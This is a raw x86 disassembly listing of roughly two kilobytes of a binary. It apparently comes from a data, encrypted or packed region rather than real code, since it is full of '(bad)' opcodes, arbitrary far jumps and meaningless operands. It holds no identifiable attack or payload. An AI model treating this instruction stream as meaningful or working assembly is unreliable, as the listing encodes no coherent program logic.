  42b41c:	xor    DWORD PTR ds:0xb504094d,esi
  42b422:	repz shl DWORD PTR [edi+0x65],0xc7
  42b427:	push   ds
  42b428:	pop    ds
  42b429:	sbb    dh,BYTE PTR [edi-0x3a]
  42b42c:	jo     0x42b422
  42b42e:	dec    edi
  42b42f:	mov    ebx,DWORD PTR [eax]
  42b431:	enter  0x709a,0x82
  42b435:	dec    esp
  42b436:	jecxz  0x42b494
  42b438:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b439:	or     al,0xb2
  42b43b:	push   0xffffffb0
  42b43d:	xchg   ecx,eax
  42b43e:	dec    esp
  42b43f:	push   ss
  42b440:	cmp    ch,BYTE PTR [esi]
  42b442:	clc    
  42b443:	call   0xf33ee27d
  42b448:	jl     0x42b3cb
  42b44a:	nop
  42b44b:	dec    esp
  42b44c:	add    eax,0xa7a8a2ed
  42b451:	push   eax
  42b452:	ret    
  42b453:	sahf   
  42b454:	test   al,0x9d
  42b456:	push   eax
  42b457:	sahf   
  42b458:	mov    WORD PTR [edi-0x39],es
  42b45b:	mov    edi,DWORD PTR [eax+0x438dcdab]
  42b461:	je     0x42b453
  42b463:	pop    ds
  42b464:	ins    BYTE PTR es:[edi],dx
  42b465:	and    esp,esp
  42b467:	inc    ebx
  42b468:	mov    dh,dl
  42b46a:	add    eax,0x767d733a
  42b46f:	cmp    esp,DWORD PTR [esi]
  42b471:	or     BYTE PTR [ecx-0x76],al
  42b474:	inc    BYTE PTR [ecx]
  42b476:	call   FWORD PTR [edi-0x60]
  42b479:	add    al,0x2a
  42b47c:	daa    
  42b47d:	push   ss
  42b47e:	or     ecx,DWORD PTR [esi-0x14]
  42b481:	jl     0x42b47f
  42b483:	add    DWORD PTR [eax+0x4f],ebx
  42b486:	(bad)  
  42b487:	(bad)
  42b48c:	pusha  
  42b48d:	jmp    DWORD PTR [eax]
  42b48f:	push   es
  42b490:	test   cl,cl
  42b492:	add    BYTE PTR [ebp-0x7b68e59b],bh
  42b498:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b499:	stc    
  42b49a:	loopne 0x42b45f
  42b49c:	nop
  42b49d:	or     ah,al
  42b49f:	sahf   
  42b4a0:	dec    esp
  42b4a1:	loopne 0x42b48d
  42b4a3:	retf   0xf62c
  42b4a6:	add    DWORD PTR [eax+0x20081354],esi
  42b4ac:	ja     0x42b50b
  42b4ae:	sub    ebx,edx
  42b4b0:	jmp    0x1fc2:0x2c5858ec
  42b4b7:	icebp  
  42b4b8:	ret    
  42b4b9:	jl     0x42b524
  42b4bb:	push   es
  42b4bc:	lea    ebp,[ebx+0x2]
  42b4bf:	cmp    BYTE PTR [ebx-0x4cee2e6c],bl
  42b4c5:	and    DWORD PTR [edx+edi*2],esp
  42b4c8:	cdq    
  42b4c9:	rcr    DWORD PTR [ebp-0x48d2db22],1
  42b4cf:	mov    dh,0xdb
  42b4d1:	test   BYTE PTR [edi],ah
  42b4d3:	dec    esi
  42b4d4:	xlat   BYTE PTR ds:[ebx]
  42b4d5:	mov    al,0x81
  42b4d7:	push   ss
  42b4d8:	repz mov dh,0x7b
  42b4db:	push   edi
  42b4dc:	popa   
  42b4dd:	lock rcr BYTE PTR [esp+ebp*4],1
  42b4e1:	push   ebx
  42b4e2:	xor    ecx,DWORD PTR [eax-0x27]
  42b4e5:	pushf  
  42b4e6:	lock xor eax,0xa13a30b9
  42b4ec:	mov    al,ds:0xa185d9bd
  42b4f1:	jmp    0x5d61af8
  42b4f6:	ins    BYTE PTR es:[edi],dx
  42b4f7:	cmc    
  42b4f8:	push   esi
  42b4f9:	adc    DWORD PTR [edi],ebp
  42b4fb:	dec    ecx
  42b4fc:	cmp    BYTE PTR [ebp-0x5191d34],bl
  42b502:	or     al,0x4a
  42b504:	stos   DWORD PTR es:[edi],eax
  42b505:	mov    ds:0x633552d8,al
  42b50a:	test   BYTE PTR [esi+ebx*1+0x71],0xaf
  42b50f:	pop    ss
  42b510:	aaa    
  42b511:	sub    al,0xc
  42b513:	loope  0x42b594
  42b515:	(bad)  
  42b516:	jmp    0x42b54d
  42b518:	into   
  42b519:	int3   
  42b51a:	or     eax,ecx
  42b51c:	hlt    
  42b51d:	xlat   BYTE PTR ds:[ebx]
  42b51e:	sub    al,0xa5
  42b520:	fst    DWORD PTR [edi]
  42b522:	shl    BYTE PTR [esi+0x713f571d],0xff
  42b529:	cmp    ch,BYTE PTR [esi+0x6d]
  42b52c:	in     eax,dx
  42b52d:	sbb    BYTE PTR [esi-0xb],0xc6
  42b531:	int3   
  42b532:	sub    eax,0x8637031c
  42b537:	adc    al,0xb9
  42b539:	lock test DWORD PTR [ebx+0x64],edx
  42b53d:	mov    ebp,0x8425ebd0
  42b542:	aam    0x17
  42b544:	xchg   ax,ax
  42b546:	dec    edx
  42b547:	or     DWORD PTR [ebp-0x18],0x25
  42b54b:	hlt    
  42b54c:	pusha  
  42b54d:	pop    ds
  42b54e:	jl     0x42b53d
  42b550:	xor    bl,BYTE PTR [edx]
  42b552:	mov    bh,0x92
  42b554:	xor    BYTE PTR [ebx],bh
  42b556:	lahf   
  42b557:	inc    edi
  42b558:	mov    dl,0x66
  42b55a:	(bad)  
  42b55b:	addr16 (bad) 
  42b55d:	xor    ebp,DWORD PTR [esi-0x1c3cf74e]
  42b563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b564:	ret    
  42b565:	sub    eax,0x556bd5a3
  42b56a:	cmp    eax,0x1266c7bc
  42b56f:	push   0x5cbf85a6
  42b574:	test   al,0x92
  42b576:	jge    0x42b5d3
  42b578:	push   ecx
  42b579:	sub    edi,edi
  42b57b:	(bad)  
  42b57d:	out    0x47,al
  42b57f:	mov    al,ah
  42b581:	ins    BYTE PTR es:[edi],dx
  42b582:	mov    eax,0xb2518cc9
  42b587:	jns    0x42b5e5
  42b589:	mov    ds:0x8dd923c9,al
  42b58e:	xlat   BYTE PTR ds:[ebx]
  42b58f:	mov    bh,0x3b
  42b591:	sar    BYTE PTR [ebx-0x4a38f53f],1
  42b597:	dec    esi
  42b598:	xchg   esp,eax
  42b599:	push   DWORD PTR [edi]
  42b59b:	xchg   edx,esi
  42b59d:	sbb    esp,DWORD PTR [esi+eax*2-0x2f]
  42b5a1:	loope  0x42b53b
  42b5a3:	es pop ebx
  42b5a5:	push   ecx
  42b5a6:	int3   
  42b5a7:	ret    
  42b5a8:	mov    WORD PTR [esi],?
  42b5aa:	daa    
  42b5ab:	adc    eax,0x3f73b36d
  42b5b0:	inc    eax
  42b5b1:	push   cs
  42b5b2:	addr16 mov cl,0xa7
  42b5b5:	add    edi,DWORD PTR ds:0xf6bd87c9
  42b5bc:	(bad)  
  42b5bd:	mov    ss,WORD PTR [eax-0x74]
  42b5c0:	pushf  
  42b5c1:	mov    WORD PTR [edi+ebx*4-0x2a329564],es
  42b5c8:	jno    0x42b566
  42b5ca:	xor    bl,BYTE PTR [ebx+0x738de6d2]
  42b5d0:	add    al,0x42
  42b5d2:	fidiv  DWORD PTR [ebp-0x48]
  42b5d5:	jle    0x42b61b
  42b5d7:	int3   
  42b5d8:	dec    ebp
  42b5d9:	xchg   DWORD PTR [esp+ebx*8+0x669d6f23],esi
  42b5e0:	jae    0x42b5ce
  42b5e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b5e3:	ud0    ecx,DWORD PTR [edx+0x3a66f01e]
  42b5ea:	ins    DWORD PTR es:[edi],dx
  42b5eb:	xchg   edi,eax
  42b5ec:	fwait
  42b5ed:	cld    
  42b5ee:	fcom   DWORD PTR [edx]
  42b5f0:	jae    0x42b5d4
  42b5f2:	addr16 xchg edi,eax
  42b5f4:	push   0xdc80927b
  42b5f9:	fstp   DWORD PTR [eax+eax*2]
  42b5fc:	jae    0x42b5c6
  42b5fe:	add    eax,0xe788a98f
  42b603:	cli    
  42b604:	xor    esi,esp
  42b606:	xchg   esi,eax
  42b607:	sbb    ecx,ebx
  42b609:	dec    esp
  42b60a:	push   esi
  42b60b:	in     eax,dx
  42b60c:	psubusb mm2,QWORD PTR [ecx]
  42b60f:	mov    ch,BYTE PTR [ecx-0x265cadfb]
  42b615:	xor    cl,BYTE PTR [edx-0x53324d0e]
  42b61b:	and    al,0xcb
  42b61d:	test   BYTE PTR [eax],al
  42b61f:	pushf  
  42b620:	dec    eax
  42b621:	nop
  42b622:	adc    BYTE PTR [ebx*8+0xead0d83],ah
  42b629:	ins    BYTE PTR es:[edi],dx
  42b62a:	fstp   TBYTE PTR [edi+0x5]
  42b62d:	outs   dx,DWORD PTR ds:[esi]
  42b62e:	in     al,0x6d
  42b630:	pop    eax
  42b631:	and    cl,ah
  42b633:	and    BYTE PTR [eax+eax*1+0x4c],bh
  42b637:	xchg   ecx,eax
  42b638:	ds scas eax,DWORD PTR es:[edi]
  42b63a:	or     esp,eax
  42b63c:	mov    dl,0x61
  42b63e:	pop    esp
  42b63f:	imul   ebp,eax,0x89465e4e
  42b645:	pushf  
  42b646:	cld    
  42b647:	ret    
  42b648:	sub    BYTE PTR [eax-0xbc8b4b3],dl
  42b64e:	and    al,0x27
  42b650:	mov    ds,WORD PTR [esi]
  42b652:	jno    0x42b6a3
  42b654:	inc    eax
  42b655:	cs jbe 0x42b6ba
  42b658:	rcr    BYTE PTR [esi+eiz*1-0x8d22186],cl
  42b65f:	aaa    
  42b660:	and    BYTE PTR [ecx+edx*2-0x734b9b90],dl
  42b667:	mov    eax,0x6a573fa0
  42b66c:	cmp    BYTE PTR [edx+0x68],al
  42b66f:	ins    DWORD PTR es:[edi],dx
  42b670:	mov    es,WORD PTR [ebx+edi*8-0x5f0f9241]
  42b677:	lods   eax,DWORD PTR ds:[esi]
  42b678:	rol    DWORD PTR [ebp+0x2784b254],1
  42b67e:	scas   eax,DWORD PTR es:[edi]
  42b67f:	adc    al,0x90
  42b681:	mov    ds:0x9bb7ecc3,eax
  42b686:	jno    0x42b62d
  42b688:	mov    al,ds:0xd333b090
  42b68d:	sbb    DWORD PTR [eax+0x565e52e1],ebp
  42b693:	dec    ebx
  42b694:	ret    0x5347
  42b697:	and    eax,0xe8ad39b4
  42b69c:	or     eax,0x56943058
  42b6a1:	pusha  
  42b6a2:	stos   DWORD PTR es:[edi],eax
  42b6a3:	adc    al,0x10
  42b6a5:	and    esp,DWORD PTR [esp+edx*1-0x308f2b4e]
  42b6ac:	stos   BYTE PTR es:[edi],al
  42b6ad:	or     cl,BYTE PTR [edx+0x6b]
  42b6b0:	jmp    0x42b692
  42b6b2:	outs   dx,BYTE PTR ds:[esi]
  42b6b3:	push   0x45
  42b6b5:	std    
  42b6b6:	sahf   
  42b6b7:	push   ss
  42b6b8:	clc    
  42b6b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b6ba:	mov    bl,0x98
  42b6bc:	clc    
  42b6bd:	(bad)  
  42b6be:	sbb    DWORD PTR [ecx+esi*8+0x14c624f2],edi
  42b6c5:	popf   
  42b6c6:	cmp    DWORD PTR [ebx+0x19cc243],ecx
  42b6cc:	test   al,0x95
  42b6ce:	mov    dl,0x2c
  42b6d0:	sti    
  42b6d1:	xchg   DWORD PTR [edx],ebx
  42b6d3:	xor    al,0x42
  42b6d5:	adc    BYTE PTR [esi+0x74],dh
  42b6d8:	mov    eax,0xee4343a0
  42b6dd:	mov    edi,edx
  42b6df:	test   al,0x49
  42b6e1:	xor    eax,0xeccaf4e1
  42b6e6:	push   0x47
  42b6e8:	mov    WORD PTR [eax-0x66],fs
  42b6eb:	fisttp QWORD PTR [edx-0x75]
  42b6ee:	xor    BYTE PTR [ebx-0x3daba8bf],dl
  42b6f4:	xchg   edx,eax
  42b6f5:	retf   
  42b6f6:	test   DWORD PTR [ebp+0x5d4d09aa],eax
  42b6fc:	sbb    cl,0xa6
  42b6ff:	or     BYTE PTR [ecx-0x5a],ch
  42b702:	xchg   BYTE PTR [ecx],bh
  42b704:	sbb    dl,BYTE PTR [eax-0x15]
  42b707:	jne    0x42b777
  42b709:	or     al,0x8e
  42b70b:	push   ebp
  42b70c:	shr    ebx,1
  42b70e:	ja     0x42b6f3
  42b710:	lock leave 
  42b712:	sbb    al,0x1c
  42b714:	pop    esi
  42b715:	shl    DWORD PTR [ecx+0x57],0x44
  42b719:	push   edi
  42b71a:	addr16 or eax,0xe0b4b74d
  42b720:	fsub   QWORD PTR [ebx-0x4d]
  42b723:	cwde   
  42b724:	lahf   
  42b725:	pop    ebx
  42b726:	outs   dx,BYTE PTR ds:[esi]
  42b727:	mov    DWORD PTR [ebp+0x2e],edx
  42b72a:	leave  
  42b72b:	pop    eax
  42b72c:	dec    ebp
  42b72d:	div    al
  42b72f:	xor    al,0x3d
  42b731:	aad    0x89
  42b733:	loope  0x42b78e
  42b735:	ins    BYTE PTR es:[edi],dx
  42b736:	out    dx,eax
  42b737:	and    ch,BYTE PTR [ebp+0x19]
  42b73a:	or     eax,esp
  42b73c:	das    
  42b73d:	ds mov edi,0xe87c7f1b
  42b743:	jne    0x42b71d
  42b745:	jb     0x42b770
  42b747:	fcom   QWORD PTR [ebp+0x59]
  42b74a:	les    ebx,FWORD PTR [edi]
  42b74c:	inc    edi
  42b74d:	xchg   esi,eax
  42b74e:	popf   
  42b74f:	cmp    ebx,DWORD PTR [eax+esi*8+0x266f9ec2]
  42b756:	mov    edi,0xd61fc4e0
  42b75b:	repnz ins WORD PTR es:[edi],dx
  42b75e:	xor    DWORD PTR ds:0xd919f186,edi
  42b764:	sbb    DWORD PTR [eax-0x15],0xfffffff3
  42b768:	test   BYTE PTR [eax],bl
  42b76a:	fwait
  42b76b:	xchg   BYTE PTR [edx],bl
  42b76d:	sbb    DWORD PTR [edx-0x28],esi
  42b770:	into   
  42b771:	jne    0x42b78b
  42b773:	mov    esi,0x8e7da4d7
  42b778:	test   eax,0x93cd5b0
  42b77d:	mov    dl,0xf5
  42b77f:	std    
  42b780:	xlat   BYTE PTR ds:[ebx]
  42b781:	aaa    
  42b782:	arpl   WORD PTR [ebp+0x5d],dx
  42b785:	or     eax,0xe5ea8211
  42b78a:	lds    ecx,FWORD PTR [edx]
  42b78c:	pop    esi
  42b78d:	std    
  42b78e:	pop    ecx
  42b78f:	sbb    ch,BYTE PTR [edi]
  42b791:	xchg   esp,eax
  42b792:	ins    BYTE PTR es:[edi],dx
  42b793:	enter  0x1d5b,0x58
  42b797:	dec    ebx
  42b798:	pop    edx
  42b799:	cmp    eax,0x4d83a053
  42b79e:	mov    dh,0x5c
  42b7a0:	inc    eax
  42b7a1:	sub    ah,BYTE PTR [ecx+0x4c]
  42b7a4:	mov    ah,0x4
  42b7a6:	mov    ds:0xc8493e1d,eax
  42b7ab:	shl    BYTE PTR [edi-0x4a],0x20
  42b7af:	push   0x56
  42b7b1:	aam    0x82
  42b7b3:	xchg   edi,eax
  42b7b4:	call   0x9b68:0x82d0c645
  42b7bb:	gs inc ecx
  42b7bd:	sahf   
  42b7be:	aam    0xdd
  42b7c0:	jne    0x42b823
  42b7c2:	shl    BYTE PTR [eax+0xe1848eb],cl
  42b7c8:	sub    ebp,DWORD PTR [eax-0x48]
  42b7cb:	xchg   esp,eax
  42b7cc:	(bad)  
  42b7cd:	enter  0x148,0xfd
  42b7d1:	and    al,0x4c
  42b7d3:	(bad)  
  42b7d4:	fadd   DWORD PTR [edi]
  42b7d6:	mov    ah,0xc3
  42b7d8:	leave  
  42b7d9:	cdq    
  42b7da:	xchg   ecx,eax
  42b7db:	dec    esp
  42b7dc:	xchg   edx,eax
  42b7dd:	retf   0x9a6b
  42b7e0:	xchg   DWORD PTR [esi],ecx
  42b7e2:	fistp  QWORD PTR [ecx-0x5f3c79f0]
  42b7e8:	dec    esp
  42b7e9:	mov    ebp,ecx
  42b7eb:	pop    ecx
  42b7ec:	xchg   esp,eax
  42b7ed:	sbb    eax,ebp
  42b7ef:	call   0x8157:0x99e86b9c
  42b7f6:	xchg   ebx,eax
  42b7f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b7f8:	les    edi,FWORD PTR [edi+0xcffed69]
  42b7fe:	xchg   ecx,eax
  42b7ff:	fabs   
  42b801:	retf   0x7e19
  42b804:	ds ins DWORD PTR es:[edi],dx
  42b806:	pop    esi
  42b807:	dec    eax
  42b808:	pop    es
  42b809:	loopne 0x42b80c
  42b80b:	xchg   edx,eax
  42b80c:	or     al,0x4e
  42b80e:	cmp    bh,BYTE PTR ds:0x63f1e884
  42b814:	cmp    ch,BYTE PTR [ecx]
  42b816:	xchg   ebx,eax
  42b817:	je     0x42b7dc
  42b819:	popf   
  42b81a:	hlt    
  42b81b:	shl    DWORD PTR [ebx-0x3b],0x0
  42b81f:	jmp    0x1f28:0x241c4103
  42b826:	idiv   BYTE PTR [edx-0x7bafda50]
  42b82c:	cmp    DWORD PTR [ecx-0x56b75339],edx
  42b832:	into   
  42b833:	nop
  42b834:	test   eax,0x16ab7743
  42b839:	pop    ss
  42b83a:	push   ecx
  42b83b:	nop
  42b83c:	inc    ebp
  42b83d:	ret    0x1d55
  42b840:	mov    eax,ds:0xa4750528
  42b845:	cmp    BYTE PTR [ebp+edx*8+0xa],bh
  42b849:	push   es
  42b84a:	jae    0x42b856
  42b84c:	cmp    bh,BYTE PTR [ebp+0x4d047416]
  42b852:	cmp    BYTE PTR [eax],dh
  42b854:	xchg   edx,eax
  42b855:	lds    ebx,FWORD PTR [ebx-0x5]
  42b858:	cmp    al,0xb0
  42b85a:	nop
  42b85b:	sub    bh,BYTE PTR [ebx-0x15]
  42b85e:	loope  0x42b8a1
  42b860:	mov    esp,0x9321b190
  42b865:	sub    ebp,DWORD PTR [edi+0x35e6c138]
  42b86b:	mov    eax,ds:0xf6e8458
  42b870:	mov    bl,0x0
  42b872:	loopne 0x42b858
  42b874:	sub    BYTE PTR [esi+0x55],cl
  42b877:	pop    esi
  42b878:	aam    0xc6
  42b87a:	arpl   WORD PTR [ecx+eiz*4-0x3a],bp
  42b87e:	(bad)  
  42b87f:	xchg   edx,eax
  42b880:	or     dh,BYTE PTR [ebx+esi*2-0x80]
  42b884:	test   DWORD PTR [ebx],0x7e68598f
  42b88a:	cmp    DWORD PTR [edx+ebx*8-0x3b],0xb94cc998
  42b892:	out    dx,al
  42b893:	pop    ebx
  42b894:	imul   edx,DWORD PTR [ecx-0x3],0xffffffde
  42b898:	add    al,0x6
  42b89a:	jge    0x42b8aa
  42b89c:	fs repz xor eax,0x5e3be1d5
  42b8a3:	push   esi
  42b8a4:	rol    BYTE PTR [ebx+0x28],1
  42b8a7:	mov    al,ds:0x89578495
  42b8ac:	scas   al,BYTE PTR es:[edi]
  42b8ad:	nop
  42b8ae:	daa    
  42b8af:	popa   
  42b8b0:	(bad)  
  42b8b1:	fisubr WORD PTR [eax-0x3a]
  42b8b4:	repz push ebx
  42b8b6:	fiadd  DWORD PTR gs:[edi]
  42b8b9:	fs es mov dl,bh
  42b8bd:	adc    al,BYTE PTR [edx-0x75e87803]
  42b8c3:	fmul   DWORD PTR [edi+eiz*2+0x2c]
  42b8c7:	dec    ebp
  42b8c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b8c9:	shr    BYTE PTR [ecx+ecx*2+0x56],cl
  42b8cd:	fwait
  42b8ce:	enter  0xa3bc,0xdd
  42b8d2:	sub    ebp,0x1
  42b8d5:	add    eax,0xc193393f
  42b8da:	call   0x70cc:0xba7b1988
  42b8e1:	mov    dh,0x39
  42b8e3:	xchg   ecx,eax
  42b8e4:	xchg   esi,eax
  42b8e5:	pushf  
  42b8e6:	mov    BYTE PTR [ebp-0x2e7dec9d],bh
  42b8ec:	xor    ah,ch
  42b8ee:	pop    es
  42b8ef:	push   es
  42b8f0:	jno    0x42b8d7
  42b8f2:	loope  0x42b8c7
  42b8f4:	cmp    BYTE PTR ds:0x10aabd9a,dh
  42b8fa:	mov    BYTE PTR [ecx-0x61f9668d],cl
  42b900:	jnp    0x42b943
  42b902:	stos   BYTE PTR es:[edi],al
  42b903:	dec    eax
  42b904:	and    BYTE PTR [esi+0x1b190225],ah
  42b90a:	ds jb  0x42b8eb
  42b90d:	cmp    al,0xb3
  42b90f:	out    0x70,al
  42b911:	inc    ebx
  42b912:	adc    BYTE PTR [ecx],ah
  42b914:	add    BYTE PTR [esi],dl
  42b916:	mov    dh,0xb5
  42b918:	mov    ds:0x4cde2691,al
  42b91d:	sar    BYTE PTR [eax-0x67bc6959],cl
  42b923:	mov    ah,0x7f
  42b925:	cs push ecx
  42b927:	ret    
  42b928:	add    al,0x61
  42b92a:	mov    ecx,0xff0b8b60
  42b92f:	cmc    
  42b930:	fdivr  QWORD PTR [esi+ebp*2]
  42b933:	mov    WORD PTR [eax-0x50],ds
  42b936:	imul   ebp,DWORD PTR [ebx+0x18],0x30a2db91
  42b93d:	pop    ss
  42b93e:	adc    eax,0x1263ff9c
  42b943:	daa    
  42b944:	dec    eax
  42b945:	mov    ds:0x8fc9b35f,al
  42b94a:	mov    esi,0x937023bb
  42b94f:	dec    ebp
  42b950:	pop    ebx
  42b951:	mov    ecx,0x2389c398
  42b956:	dec    ecx
  42b957:	fs out 0xf3,eax
  42b95a:	js     0x42b9c9
  42b95c:	mov    dl,0x80
  42b95e:	mov    ebx,0xce900757
  42b963:	xor    WORD PTR [ebx],di
  42b966:	xchg   ebx,eax
  42b967:	and    al,0x24
  42b969:	push   eax
  42b96a:	and    ch,BYTE PTR ds:0x2623c368
  42b970:	movsx  esi,al
  42b973:	scas   eax,DWORD PTR es:[edi]
  42b974:	jmp    0x42b907
  42b976:	cli    
  42b977:	hlt    
  42b978:	retf   
  42b979:	xor    BYTE PTR [ebp-0x2d],cl
  42b97c:	mov    eax,es:0x4e8e791d
  42b982:	cld    
  42b983:	and    DWORD PTR [ebp+0x61],ebp
  42b986:	pop    ss
  42b987:	mov    al,ds:0x2f33bce7
  42b98c:	and    BYTE PTR [edi],dl
  42b98e:	outs   dx,BYTE PTR ds:[esi]
  42b98f:	sbb    BYTE PTR [ebx-0x3003cd00],bh
  42b995:	inc    ebx
  42b996:	packssdw mm6,QWORD PTR [ecx+0x416ce3a6]
  42b99d:	out    0x88,al
  42b99f:	pop    es
  42b9a0:	hlt    
  42b9a1:	je     0x42ba05
  42b9a3:	push   cs
  42b9a4:	jae    0x42b957
  42b9a6:	adc    ecx,ebp
  42b9a8:	dec    eax
  42b9a9:	sahf   
  42b9aa:	push   0xffffffd7
  42b9ac:	add    al,0x0
  42b9ae:	imul   eax,DWORD PTR [esi+ecx*1+0xb],0xffffffaa
  42b9b3:	cmp    DWORD PTR [ebx],edx
  42b9b5:	adc    DWORD PTR [edi],esp
  42b9b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b9b8:	dec    ebp
  42b9b9:	jne    0x42ba23
  42b9bb:	jmp    0x42b9ee
  42b9bd:	and    DWORD PTR [esi-0x51],esi
  42b9c0:	sbb    ecx,DWORD PTR [edx]
  42b9c2:	or     eax,ecx
  42b9c4:	mov    cl,0xff
  42b9c6:	pop    esi
  42b9c7:	ret    0x61c9
  42b9ca:	rcl    DWORD PTR [edx],1
  42b9cc:	mov    edx,0x86d58b0c
  42b9d1:	xor    eax,0xe26d22f6
  42b9d6:	xor    bl,BYTE PTR [esi-0x66]
  42b9d9:	sub    ebp,DWORD PTR [eax-0x4de9421b]
  42b9df:	add    ebp,ebx
  42b9e1:	add    BYTE PTR [edx],0x8a
  42b9e4:	pusha  
  42b9e5:	jb     0x42ba20
  42b9e7:	mov    ds:0x464f56a8,al
  42b9ec:	mov    cl,0xa9
  42b9ee:	in     eax,dx
  42b9ef:	mov    al,0x2d
  42b9f1:	add    al,0x9
  42b9f3:	aas    
  42b9f4:	jl     0x42b989
  42b9f6:	add    edi,DWORD PTR [ecx+0x3f3c0f06]
  42b9fc:	fwait
  42b9fd:	rcr    ah,0x70
  42ba00:	push   cs
  42ba01:	xor    edx,DWORD PTR [ebp+0x59]
  42ba04:	xchg   ebp,eax
  42ba05:	out    dx,al
  42ba06:	bound  esi,QWORD PTR [ecx+0x7]
  42ba09:	mov    ch,0x67
  42ba0b:	in     al,0xb0
  42ba0d:	sub    BYTE PTR [ebx-0x581ecf28],dh
  42ba13:	pop    es
  42ba14:	push   edi
  42ba15:	mov    bl,0x0
  42ba17:	repz inc esi
  42ba19:	add    ah,dh
  42ba1b:	out    dx,al
  42ba1c:	cmp    bh,BYTE PTR [ecx+ecx*8+0x7e29e1d9]
  42ba23:	or     ch,ch
  42ba25:	sbb    DWORD PTR [ecx+0x69b1451e],eax
  42ba2b:	add    ah,BYTE PTR [esi]
  42ba2d:	push   es
  42ba2e:	cmp    eax,0x6836562d
  42ba33:	inc    edi
  42ba34:	ds inc esp
  42ba36:	int    0xd0
  42ba38:	xor    ecx,DWORD PTR [eax-0x29]
  42ba3b:	shl    esp,cl
  42ba3d:	out    dx,al
  42ba3e:	rep stos BYTE PTR es:[edi],al
  42ba40:	xchg   esi,eax
  42ba41:	or     edi,DWORD PTR [esi]
  42ba43:	sbb    dh,BYTE PTR [esi+0x7b1a36e2]
  42ba49:	dec    esi
  42ba4a:	xor    DWORD PTR [ebx+0x66620916],esp
  42ba50:	or     DWORD PTR ds:[edi+0x4ba386df],ebp
  42ba57:	or     ch,dh
  42ba59:	mov    ebp,0xc5be1ea6
  42ba5e:	inc    ebp
  42ba5f:	cld    
  42ba60:	jbe    0x42ba40
  42ba62:	mov    WORD PTR [esi],ds
  42ba64:	mov    edi,0x2ff4cf1d
  42ba69:	mov    ds:0xb0c392d1,al
  42ba6e:	rol    BYTE PTR [esi+ecx*1+0xbedee3f],1
  42ba75:	xchg   ebx,eax
  42ba76:	xchg   sp,ax
  42ba78:	loope  0x42ba1e
  42ba7a:	rcl    eax,cl
  42ba7c:	dec    esi
  42ba7d:	adc    BYTE PTR [edx+0x32],bh
  42ba80:	daa    
  42ba81:	sub    bl,al
  42ba83:	stos   DWORD PTR es:[edi],eax
  42ba84:	clc    
  42ba85:	aam    0x46
  42ba87:	das    
  42ba88:	mov    esi,0x73452e7a
  42ba8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba8e:	loopne 0x42ba6a
  42ba90:	xor    eax,0xf67bec3e
  42ba95:	xor    al,BYTE PTR [esi-0x24]
  42ba98:	ds pushf 
  42ba9a:	and    bl,dl
  42ba9c:	je     0x42bab6
  42ba9e:	cmp    bh,BYTE PTR [ebx]
  42baa0:	adc    al,BYTE PTR [edi-0x69f2c6bc]
  42baa6:	and    edx,DWORD PTR [edi]
  42baa8:	pushf  
  42baa9:	sbb    BYTE PTR [esi],al
  42baab:	call   0x68ced9d4
  42bab0:	mov    WORD PTR [esi],fs
  42bab2:	add    BYTE PTR [ebx-0x433cc178],bl
  42bab8:	jb     0x42bb30
  42baba:	test   al,0x18
  42babc:	sub    esp,DWORD PTR [edi+0x38]
  42babf:	stos   BYTE PTR es:[edi],al
  42bac0:	dec    esi
  42bac1:	jno    0x42ba75
  42bac3:	in     eax,dx
  42bac4:	ja     0x42bb44
  42bac6:	outs   dx,DWORD PTR ds:[esi]
  42bac7:	xor    edx,DWORD PTR [edi+ebx*8+0x73a5e08d]
  42bace:	xor    ch,dl
  42bad0:	jge    0x42bae4
  42bad2:	jmp    0xb9c5:0xf4b4f4dc
  42bad9:	mov    ecx,0x3325460a
  42bade:	push   esi
  42badf:	adc    DWORD PTR [edx+0x1e],ebx
  42bae2:	and    BYTE PTR [ebx-0x1f4898c3],bl
  42bae8:	bound  edi,QWORD PTR [edx+0x6291882]
  42baee:	cdq    
  42baef:	test   al,0x11
  42baf2:	inc    edx
  42baf3:	(bad)  
  42baf4:	push   ds
  42baf5:	sbb    bl,BYTE PTR [ecx+0x3bd41488]
  42bafb:	dec    esp
  42bafc:	enter  0x995,0x31
  42bb00:	xchg   edx,eax
  42bb01:	adc    ah,BYTE PTR [eax]
  42bb03:	ror    BYTE PTR [eax+0x182cbbbb],0x4c
  42bb0a:	or     dl,BYTE PTR [esi-0x56]
  42bb0d:	or     bl,BYTE PTR [esi]
  42bb0f:	push   0xb49cc897
  42bb14:	ret    
  42bb15:	fcom   QWORD PTR [edi]
  42bb17:	sbb    BYTE PTR [ebp-0x2908bfb0],0x7a
  42bb1e:	xor    ch,BYTE PTR [edi]
  42bb20:	dec    esp
  42bb21:	js     0x42bb20
  42bb23:	mov    fs,WORD PTR [edi+0x70]
  42bb26:	mov    cl,0xa2
  42bb28:	test   al,0xe7
  42bb2a:	arpl   WORD PTR [eax],dx
  42bb2c:	cmp    ah,BYTE PTR [ebx]
  42bb2e:	push   edx
  42bb2f:	push   cs
  42bb30:	jp     0x42bb94
  42bb32:	adc    esp,DWORD PTR [ebx]
  42bb34:	popf   
  42bb35:	adc    eax,0xa0a98013
  42bb3a:	jns    0x42bb2f
  42bb3c:	mov    eax,0xd9ff7ba0
  42bb41:	pop    es
  42bb42:	shr    BYTE PTR [ecx+0x4dc8f06d],1
  42bb48:	in     eax,dx
  42bb49:	jo     0x42bb20
  42bb4b:	or     edx,ebp
  42bb4d:	dec    edx
  42bb4e:	xor    ebx,DWORD PTR [edx-0x8789712]
  42bb54:	call   0x11712189
  42bb59:	mov    WORD PTR [ecx-0x626ff7d5],?
  42bb5f:	inc    BYTE PTR [edi-0x4123e69d]
  42bb65:	sahf   
  42bb66:	ss mov ebp,0x8b6704a9
  42bb6c:	adc    esp,DWORD PTR [edi+0x2ea3295f]
  42bb72:	(bad)  
  42bb74:	fcomp  DWORD PTR [edx+ebx*1+0x77]
  42bb78:	jle    0x42bbda
  42bb7a:	xor    eax,0xfc3a41ac
  42bb7f:	add    eax,DWORD PTR [ebp+0x5c]
  42bb82:	sbb    al,0xcc
  42bb84:	jecxz  0x42bb58
